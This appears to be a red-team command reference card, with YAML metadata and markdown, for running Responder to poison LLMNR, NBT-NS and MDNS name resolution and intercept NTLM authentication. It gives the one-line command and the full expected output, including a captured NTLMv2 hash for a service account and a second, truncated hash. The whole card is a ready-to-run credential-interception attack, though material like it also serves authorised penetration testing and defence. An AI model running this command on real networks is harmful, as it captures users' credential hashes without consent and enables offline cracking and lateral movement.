---
id: 2fd822da-a5cd-4f12-99cc-4fd065d58150
name: Responder Intercept an NTLM Hash
type: command
executor: bash
data: responder -I $_INTERFACE
output: "root@kali:~# responder -I eth0\n                                        \
  \ __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__\
  \ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n\
  \                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 2.3.3.9\n\n\
  \  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit\
  \ CRTL-C\n\n\n[+] Poisoners:\n    LLMNR                      [ON]\n    NBT-NS  \
  \                   [ON]\n    DNS/MDNS                   [ON]\n\n[+] Servers:\n\
  \    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD\
  \ proxy                 [OFF]\n    Auth proxy                 [OFF]\n    SMB server\
  \                 [ON]\n...\n...\n[+] Listening for events...\n[SMBv2] NTLMv2-SSP\
  \ Client   : 10.10.10.10\n[SMBv2] NTLMv2-SSP Username : BOB\\mssql-svc\n[SMBv2]\
  \ NTLMv2-SSP Hash     : mssql-svc::BOB:9906216b9bfb7353:C887578FCEC28FE5D27D98BE125563CD:0101000000000000C0653150DE09D\n\
  201C8FAE92FB32A810B000000000200080053004D004200330001001E00570049004E002D0050005200480034003900320052005100410046005600040014005\n\
  3004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002\n\
  E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000\n\
  00000000000000000300000765B8BC67A6A62885BDC779C99E61D6D82291EBB7DDB4DF24FE2AF8AF36813510A001000000000000000000000000000000000000\n\
  900200063006900660073002F00310030002E00310030002E00310034002E0034003500000000000000000000000000\n\
  [*] Skipping previously captured hash for BOB\\mssql-svc\n[SMBv2] NTLMv2-SSP Client\
  \   : 10.10.10.10\n[SMBv2] NTLMv2-SSP Username : \\gX\n[SMBv2] NTLMv2-SSP Hash \
  \    : gX:::39aa9031a80680cd::\n[*] Skipping previously captured hash for \\gX\n\
  [+] Exiting..."
created_at: '2019-10-01T17:58:48.950571+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Responder Intercept an NTLM Hash

```bash
responder -I $_INTERFACE
```

## Expected Output

```
root@kali:~# responder -I eth0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3.3.9

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CRTL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
...
...
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.10
[SMBv2] NTLMv2-SSP Username : BOB\mssql-svc
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::BOB:9906216b9bfb7353:C887578FCEC28FE5D27D98BE125563CD:0101000000000000C0653150DE09D
201C8FAE92FB32A810B000000000200080053004D004200330001001E00570049004E002D0050005200480034003900320052005100410046005600040014005
3004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002
E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000
00000000000000000300000765B8BC67A6A62885BDC779C99E61D6D82291EBB7DDB4DF24FE2AF8AF36813510A001000000000000000000000000000000000000
900200063006900660073002F00310030002E00310030002E00310034002E0034003500000000000000000000000000
[*] Skipping previously captured hash for BOB\mssql-svc
[SMBv2] NTLMv2-SSP Client   : 10.10.10.10
[SMBv2] NTLMv2-SSP Username : \gX
[SMBv2] NTLMv2-SSP Hash     : gX:::39aa9031a80680cd::
[*] Skipping previously captured hash for \gX
[+] Exiting...
```
